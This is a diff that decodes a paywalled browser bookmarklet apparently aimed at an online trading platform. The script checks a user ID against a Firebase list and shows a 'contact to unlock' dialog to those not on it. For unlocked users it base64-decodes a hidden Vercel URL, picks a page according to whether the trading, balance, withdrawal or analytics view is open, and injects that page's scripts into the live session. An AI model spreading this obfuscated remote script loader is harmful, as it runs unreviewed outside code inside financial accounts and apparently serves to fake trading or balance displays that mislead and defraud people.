@@ -1,1 +1,196 @@
-javascript%3A(function()%7B%0A%0Avar%20pID%3D%22reactions-maker-site%22%2C%0Adb%3D%22https%3A%2F%2F%22%2BpID%2B%22-default-rtdb.firebaseio.com%2Fusers.json%22%2C%0Aimg%3D%22https%3A%2F%2Fi.ibb.co%2FZ69FyZ04%2F20251103-091451.png%22%3B%0A%0Aconst%20uP%3Dnew%20URLSearchParams(window.location.search)%3B%0Alet%20id%3DuP.get(%27id%27)%3B%0A%0Aif(!id)%7B%0Aid%3DlocalStorage.getItem(%27ahmad_script_uid%27)%3B%0Aif(!id)%7B%0Aid%3D%22%22%3B%0Afor(var%20i%3D0%3Bi%3C20%3Bi%2B%2B)%20id%2B%3DMath.floor(Math.random()*10)%3B%0AlocalStorage.setItem(%27ahmad_script_uid%27%2Cid)%0A%7D%7D%0A%0Avar%20loader%3Ddocument.createElement(%27div%27)%3B%0AObject.assign(loader.style%2C%7B%0Aposition%3A%27fixed%27%2C%0Atop%3A%270%27%2C%0Aleft%3A%270%27%2C%0Awidth%3A%27100vw%27%2C%0Aheight%3A%27100vh%27%2C%0Abackground%3A%27%231c242a%27%2C%0AzIndex%3A%271000000%27%2C%0Adisplay%3A%27flex%27%2C%0AflexDirection%3A%27column%27%2C%0AjustifyContent%3A%27center%27%2C%0AalignItems%3A%27center%27%2C%0Acolor%3A%27white%27%2C%0AfontFamily%3A%27sans-serif%27%0A%7D)%3B%0A%0Aloader.innerHTML%3D%60%3Cimg%20src%3D%22%24%7Bimg%7D%22%20style%3D%22width%3A85px%3Bmargin-bottom%3A15px%3B%22%3E%0A%3Cdiv%20style%3D%22letter-spacing%3A2px%3Bfont-weight%3Abold%3Bfont-size%3A14px%22%3E%0ACODE%20LOADING...%0A%3C%2Fdiv%3E%60%3B%0A%0Adocument.body.appendChild(loader)%3B%0A%0Afetch(db).then(r%3D%3Er.json()).then(d%3D%3E%7B%0A%0Avar%20ok%3Dfalse%3B%0A%0Aif(d)%7B%0AObject.values(d).forEach(u%3D%3E%7B%0Aif(u.id%3D%3D%3Did)%20ok%3Dtrue%0A%7D)%0A%7D%0A%0Aloader.remove()%3B%0A%0Aif(ok)%7B%0ArunHTML()%3B%0A%7Delse%7B%0AshowLock(id)%3B%0A%7D%0A%0A%7D).catch(()%3D%3E%7B%0Aloader.remove()%3B%0AshowLock(id)%3B%0A%7D)%3B%0A%0A%0A%0Afunction%20showLock(id)%7B%0A%0Adocument.querySelectorAll(%22dialog%22).forEach(d%3D%3Ed.remove())%3B%0A%0Avar%20color%3D%22%231c242a%22%3B%0A%0Avar%20html%3D%60%3Cdiv%20style%3D%22font-family%3Asans-serif%3Bpadding%3A1rem%3Bbackground%3A%24%7Bcolor%7D%3B%0Awidth%3A%24%7Bscreen.width%3E500%3F%22400px%22%3A(screen.width-40)%2B%22px%22%7D%3B%0Aborder-top%3A5px%20solid%20%2305c55e%22%3E%0A%0A%3Cdiv%20style%3D%22text-align%3Acenter%22%3E%0A%3Cdiv%20style%3D%22line-height%3A50px%3Bfont-size%3A30px%3Bcolor%3A%23fff%3Bfont-weight%3A900%22%3E%0ALOCKED%0A%3C%2Fdiv%3E%0A%0A%3Cdiv%20style%3D%22display%3Aflex%3Bjustify-content%3Acenter%3Balign-items%3Acenter%3Bmargin-top%3A5px%3B%22%3E%0A%3Csvg%20width%3D%2250%22%20height%3D%2250%22%20viewBox%3D%220%200%20180%20180%22%3E%0A%3Cg%20transform%3D%22translate(0%2C180)%20scale(0.1%2C-0.1)%22%20fill%3D%22%23fff%22%3E%0A%3Cpath%20d%3D%22M753%201622%20l-133%20-77%200%20-67%200%20-67%2087%2050%20105%2060%2018%20-626%200%20-636%20-50%2028%20-50%2028%200%20443%200%20442%20-55%200%20-55%200%200%20-405%20-7%20-405%20-50%2022%20-43%2023%200%20308%200%20308%20-57%20-3%20-58%20-3%20-5%20-267%20-5%20-267%20-40%2022%20-40%2023%200%20339%200%20339%20103%2059%20102%2059%200%2064%20-6%2064%20-165%20-92%20-159%20-92%200%20-401%200%20-401%20342%20-198%20348%20-199%20353%20199%20342%20199%200%20400%200%20400%20-159%2093%20-165%2092%20-6%20-64%200%20-63%20103%20-60%20102%20-59%200%20-339%200%20-340%20-42%20-23%20-43%20-23%200%20270%200%20271%20-60%200%20-60%200%200%20-307%200%20-308%20-40%20-22%20-44%20-23%20-6%20405%200%20405%20-60%200%20-60%200%200%20-443%200%20-442%20-46%20-28%20-50%20-24%20-2%20635%203%20632%20103%20-60%20108%20-60%204%2065%200%2064%20-92%2054%20-138%2080%20-45%2026%20-132%20-77z%22%2F%3E%0A%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A%3C%2Fdiv%3E%0A%0A%3C%2Fdiv%3E%0A%0A%3Cbr%3E%0A%0A%3Cdiv%20style%3D%22text-align%3Acenter%3Bcolor%3A%23fff%3Bword-break%3Abreak-all%3B%0Afont-family%3Amonospace%3B%22%3E%24%7Bid%7D%3C%2Fdiv%3E%0A%0A%3Cbr%3E%0A%0A%3Cdiv%20style%3D%22text-align%3Acenter%22%3E%0A%3Cbutton%20style%3D%22padding%3A10px%2020px%3Bbackground%3A%2305c55e%3B%0Acolor%3A%23fff%3Bborder%3Anone%3Bcursor%3Apointer%3Bfont-weight%3Abold%22%3E%0ACLOSE%0A%3C%2Fbutton%3E%0A%3C%2Fdiv%3E%0A%0A%3Cbr%3E%0A%0A%3Cdiv%20style%3D%22color%3A%23ff6251%3Bfont-size%3A12px%22%3E%0A%F0%9F%93%9D%20CONTACT%20%2B923120883884%20TO%20UNLOCK%20!!!%20%F0%9F%94%93%0A%3C%2Fdiv%3E%0A%0A%3Chr%20style%3D%22border-color%3A%23fff%22%3E%0A%0A%3Cdiv%20style%3D%22text-align%3Acenter%3Bcolor%3A%23fff%22%3E%0AMade%20with%20%0A%3Cspan%20style%3D%22animation%3Aheartbeat%201.4s%20infinite%3Bcolor%3A%23ffb3b3%3B%22%3E%E2%99%A5%3C%2Fspan%3E%20%0Aby%20%3Ca%20style%3D%22color%3A%23fff%3Btext-decoration%3Anone%3B%22%0Ahref%3D%22https%3A%2F%2Ft.me%2FAhmadTrader3%22%3E%40AhmadTrader3%3C%2Fa%3E%0A%3C%2Fdiv%3E%0A%0A%3C%2Fdiv%3E%60%3B%0A%0Avar%20dialog%3Ddocument.createElement(%22dialog%22)%3B%0Adocument.body.appendChild(dialog)%3B%0Adialog.innerHTML%3Dhtml%3B%0A%0Avar%20style%3Ddocument.createElement(%22style%22)%3B%0Astyle.innerHTML%3D%60%0A%40keyframes%20heartbeat%7B%0A0%25%7Bcolor%3A%23ffb3b3%7D%0A35%25%7Bcolor%3A%23ff1a1a%7D%0A100%25%7Bcolor%3A%23ffb3b3%7D%0A%7D%0Adialog%3A%3Abackdrop%7B%0Abackground%3A%2305c55e%3B%0Aopacity%3A.25%0A%7D%60%3B%0Adocument.head.appendChild(style)%3B%0A%0Adialog.showModal()%3B%0A%0Adialog.querySelector(%22button%22).onclick%3D()%3D%3E%7B%0Adialog.close()%3B%0A%7D%3B%0A%0A%7D%0A%0A%0A%0Afunction%20runHTML()%7B%0A%0Avar%20base%3Datob(%27aHR0cHM6Ly9haG1hZC1iaGFpLXNjcmlwdHMudmVyY2VsLmFwcC8%3D%27)%3B%0A%0Avar%20getFile%3D()%3D%3E%7B%0Avar%20p%3Dlocation.href.split(%22en%2F%22)%5B1%5D%3F.replace(%22%2F%22%2C%22%22)%7C%7C%22%22%3B%0A%0Aif(document.querySelector(%22%23root%20%3E%20div%20%3E%20div.mobile-trade-list%22))%0Areturn%20%22win.html%22%3B%0A%0Aif(document.querySelector(%22.---react-features-Sidepanel-styles-module__active--qe_nH%22)%0A%3F.classList%5B3%5D%3F.includes(%22active%22))%0Areturn%20%22LB.html%22%3B%0A%0Aif(p%3D%3D%3D%22balance%22%7C%7Cp%3D%3D%3D%22withdrawal%22)%0Areturn%20%22p.html%22%3B%0A%0Aif(p%3D%3D%3D%22analytics%22)%0Areturn%20%22ana.html%22%3B%0A%0Areturn%20%2FAndroid%7CiPhone%7CiPad%7CiPod%2Fi.test(navigator.userAgent)%0A%3F%20%22android.html%22%0A%3A%20%22pc.html%22%3B%0A%7D%3B%0A%0Afetch(base%2BgetFile())%0A.then(r%3D%3Er.text())%0A.then(html%3D%3E%7B%0A%0Avar%20parser%3Dnew%20DOMParser()%3B%0Avar%20doc%3Dparser.parseFromString(html%2C%22text%2Fhtml%22)%3B%0A%0Adoc.querySelectorAll(%22script%22).forEach(scr%3D%3E%7B%0Avar%20newScr%3Ddocument.createElement(%22script%22)%3B%0Aif(scr.src)%7B%0AnewScr.src%3Dscr.src%3B%0A%7Delse%7B%0AnewScr.textContent%3Dscr.innerHTML%3B%0A%7D%0Adocument.body.appendChild(newScr)%3B%0A%7D)%3B%0A%0A%7D)%3B%0A%0A%7D%0A%0A%7D)()%3B
+javascript:(function(){
+
+var pID="reactions-maker-site",
+db="https://"+pID+"-default-rtdb.firebaseio.com/users.json",
+img="https://ahmad-bhai-codes-shop.vercel.app/Ahmad.png";
+
+const uP=new URLSearchParams(window.location.search);
+let id=uP.get('id');
+
+if(!id){
+id=localStorage.getItem('ahmad_script_uid');
+if(!id){
+id="";
+for(var i=0;i<20;i++) id+=Math.floor(Math.random()*10);
+localStorage.setItem('ahmad_script_uid',id)
+}}
+
+var loader=document.createElement('div');
+Object.assign(loader.style,{
+position:'fixed',
+top:'0',
+left:'0',
+width:'100vw',
+height:'100vh',
+background:'#1c242a',
+zIndex:'1000000',
+display:'flex',
+flexDirection:'column',
+justifyContent:'center',
+alignItems:'center',
+color:'white',
+fontFamily:'sans-serif'
+});
+
+loader.innerHTML=`<img src="${img}" style="width:85px;margin-bottom:15px;">
+<div style="letter-spacing:2px;font-weight:bold;font-size:14px">
+CODE LOADING...
+</div>`;
+
+document.body.appendChild(loader);
+
+fetch(db).then(r=>r.json()).then(d=>{
+
+var ok=false;
+
+if(d){
+Object.values(d).forEach(u=>{
+if(u.id===id) ok=true
+})
+}
+
+loader.remove();
+
+if(ok){
+runHTML();
+}else{
+showLock(id);
+}
+
+}).catch(()=>{
+loader.remove();
+showLock(id);
+});
+
+
+
+function showLock(id){
+
+document.querySelectorAll("dialog").forEach(d=>d.remove());
+
+var color="#1c242a";
+
+var html=`<div style="font-family:sans-serif;padding:1rem;background:${color};
+width:${screen.width>500?"400px":(screen.width-40)+"px"};
+border-top:5px solid #05c55e">
+
+<div style="text-align:center">
+<div style="line-height:50px;font-size:30px;color:#fff;font-weight:900">
+LOCKED
+</div>
+
+<div style="display:flex;justify-content:center;align-items:center;margin-top:5px;">
+<svg width="50" height="50" viewBox="0 0 180 180">
+<g transform="translate(0,180) scale(0.1,-0.1)" fill="#fff">
+<path d="M753 1622 l-133 -77 0 -67 0 -67 87 50 105 60 18 -626 0 -636 -50 28 -50 28 0 443 0 442 -55 0 -55 0 0 -405 -7 -405 -50 22 -43 23 0 308 0 308 -57 -3 -58 -3 -5 -267 -5 -267 -40 22 -40 23 0 339 0 339 103 59 102 59 0 64 -6 64 -165 -92 -159 -92 0 -401 0 -401 342 -198 348 -199 353 199 342 199 0 400 0 400 -159 93 -165 92 -6 -64 0 -63 103 -60 102 -59 0 -339 0 -340 -42 -23 -43 -23 0 270 0 271 -60 0 -60 0 0 -307 0 -308 -40 -22 -44 -23 -6 405 0 405 -60 0 -60 0 0 -443 0 -442 -46 -28 -50 -24 -2 635 3 632 103 -60 108 -60 4 65 0 64 -92 54 -138 80 -45 26 -132 -77z"/>
+</g>
+</svg>
+</div>
+
+</div>
+
+<br>
+
+<div style="text-align:center;color:#fff;word-break:break-all;
+font-family:monospace;">${id}</div>
+
+<br>
+
+<div style="text-align:center">
+<button style="padding:10px 20px;background:#05c55e;
+color:#fff;border:none;cursor:pointer;font-weight:bold">
+CLOSE
+</button>
+</div>
+
+<br>
+
+<div style="color:#ff6251;font-size:12px">
+📝 CONTACT +923120883884 TO UNLOCK !!!
+</div>
+
+<hr style="border-color:#fff">
+
+<div style="text-align:center;color:#fff">
+Made with 
+<span style="animation:heartbeat 1.4s infinite;color:#ffb3b3;">♥</span> 
+by <a style="color:#fff;text-decoration:none;"
+href="https://t.me/AhmadTrader3">@AhmadTrader3</a>
+</div>
+
+</div>`;
+
+var dialog=document.createElement("dialog");
+document.body.appendChild(dialog);
+dialog.innerHTML=html;
+
+var style=document.createElement("style");
+style.innerHTML=`
+@keyframes heartbeat{
+0%{color:#ffb3b3}
+35%{color:#ff1a1a}
+100%{color:#ffb3b3}
+}
+dialog::backdrop{
+background:#05c55e;
+opacity:.25
+}`;
+document.head.appendChild(style);
+
+dialog.showModal();
+
+dialog.querySelector("button").onclick=()=>{
+dialog.close();
+};
+
+}
+
+
+
+function runHTML(){
+
+var base=atob('aHR0cHM6Ly9haG1hZC1iaGFpLXNjcmlwdHMudmVyY2VsLmFwcC8=');
+
+var getFile=()=>{
+var p=location.href.split("en/")[1]?.replace("/","")||"";
+
+if(document.querySelector("#root > div > div.mobile-trade-list"))
+return "win.html";
+
+if(document.querySelector(".---react-features-Sidepanel-styles-module__active--qe_nH")
+?.classList[3]?.includes("active"))
+return "LB.html";
+
+if(p==="balance"||p==="withdrawal")
+return "p.html";
+
+if(p==="analytics")
+return "ana.html";
+
+return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
+? "android.html"
+: "pc.html";
+};
+
+fetch(base+getFile())
+.then(r=>r.text())
+.then(html=>{
+
+var parser=new DOMParser();
+var doc=parser.parseFromString(html,"text/html");
+
+doc.querySelectorAll("script").forEach(scr=>{
+var newScr=document.createElement("script");
+if(scr.src){
+newScr.src=scr.src;
+}else{
+newScr.textContent=scr.innerHTML;
+}
+document.body.appendChild(newScr);
+});
+
+});
+
+}
+
+})();
